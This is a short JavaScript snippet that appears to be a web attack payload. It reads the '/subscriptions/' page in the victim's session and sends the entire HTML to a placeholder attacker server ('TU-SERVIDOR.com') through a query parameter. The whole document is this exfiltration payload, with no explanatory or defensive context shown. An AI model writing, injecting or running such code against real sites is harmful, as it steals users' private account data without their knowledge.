fetch('/subscriptions/')
  .then(r => r.text())
  .then(html => {
    fetch('https://TU-SERVIDOR.com/log?data=' + encodeURIComponent(html));
  });
